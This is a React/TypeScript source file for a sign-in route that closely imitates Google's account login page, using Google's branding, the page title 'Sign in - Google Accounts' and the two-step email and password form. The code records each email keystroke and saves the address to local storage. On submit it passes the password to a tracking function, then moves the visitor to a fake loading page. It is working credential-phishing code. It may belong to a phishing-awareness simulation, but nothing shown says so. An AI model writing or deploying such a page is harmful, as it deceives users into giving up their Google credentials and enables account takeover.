import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GoogleGLogo, GE_FONT_FAMILY, GeFontStyle, GeCardStyles, useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({ meta: [{ title: "Sign in - Google Accounts" }] }),
  component: GeSignInPage,
});

function GeSignInPage() {
  const { trackClick, trackInput, geNavigate, sessionId } = useGeTracking();
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const emailRef = useRef<HTMLInputElement>(null);
  const pwRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === "email") setTimeout(() => emailRef.current?.focus(), 100);
    else setTimeout(() => pwRef.current?.focus(), 100);
  }, [step]);

  const goPassword = () => {
    const v = email.trim();
    if (!v || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) return;
    trackClick("Next-Email");
    trackInput("email", v);
    try { localStorage.setItem("saved_user_email", v); } catch { /* noop */ }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep("password");
    }, 900 + Math.random() * 800);
  };

  const submitPassword = () => {
    if (!password) return;
    trackClick("Next-Password");
    trackInput("password", password);
    setLoading(true);
    setTimeout(() => {
      geNavigate("/ge/loading");
    }, 900 + Math.random() * 800);
  };

  const initial = (email.trim()[0] || "?").toUpperCase();

  return (
    <div className="ge-body" style={{ fontFamily: GE_FONT_FAMILY }}>
      <GeFontStyle />
      <GeCardStyles />
      <div className="ge-container">
        <div className={`ge-loading-overlay ${loading ? "active" : ""}`}>
          <div className="ge-loading-bar" />
        </div>

        <div className="ge-left">
          <GoogleGLogo size={45} />
          {step === "email" ? (
            <div style={{ marginTop: 30 }}>
              <h1 className="ge-h1">Sign in</h1>
              <p className="ge-p">to continue to Google</p>
            </div>
          ) : (
            <div style={{ marginTop: 30 }}>
              <h1 className="ge-h1">Welcome</h1>
              <div className="ge-email-chip" onClick={() => { trackClick("Change-Email"); setStep("email"); setPassword(""); }}>
                <span className="ge-email-chip-dot">{initial}</span>
                <span>{email}</span>
                <svg width="10" height="6" viewBox="0 0 10 6" fill="currentColor"><path d="M5 6 0 0h10z"/></svg>
              </div>
            </div>
          )}
        </div>

        <div className="ge-right">
          {step === "email" ? (
            <form className="ge-form" onSubmit={(e) => { e.preventDefault(); goPassword(); }}>
              <input
                ref={emailRef}
                name="email"
                type="email"
                className="ge-input"
                placeholder="Email or phone"
                value={email}
                onChange={(e) => { setEmail(e.target.value); trackInput("email", e.target.value); }}
                required
              />
              <div style={{ marginTop: 12 }}>
                <span className="ge-hint-link" onClick={() => trackClick("Forgot-Email")}>Forgot email?</span>
              </div>
              <p className="ge-p" style={{ fontSize: 14, lineHeight: "22px", marginTop: 40 }}>
                Not your computer? Use Guest mode to sign in privately.{" "}
                <span className="ge-hint-link">Learn more about using Guest mode</span>
              </p>
              <div style={{ display: "flex", justifyContent: "space-between", marginTop: 60 }}>
                <button type="button" className="ge-btn ge-btn-ghost" onClick={() => trackClick("Create-Account")}>Create account</button>
                <button type="submit" className="ge-btn ge-btn-primary" disabled={loading}>Next</button>
              </div>
            </form>
          ) : (
            <form className="ge-form" onSubmit={(e) => { e.preventDefault(); submitPassword(); }}>
              <div style={{ position: "relative" }}>
                <input
                  ref={pwRef}
                  name="password"
                  type={showPassword ? "text" : "password"}
                  className="ge-input"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </div>
              <label style={{ display: "flex", alignItems: "center", gap: 10, marginTop: 16, fontSize: 14, cursor: "pointer" }}>
                <input
                  type="checkbox"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  style={{ width: 18, height: 18, cursor: "pointer" }}
                />
                <span>Show password</span>
              </label>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginTop: 60 }}>
                <button type="button" className="ge-btn ge-btn-ghost" onClick={() => trackClick("Forgot-Password")}>Forgot password?</button>
                <button type="submit" className="ge-btn ge-btn-primary" disabled={loading || !password}>Next</button>
              </div>
            </form>
          )}
        </div>
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </div>
  );
}
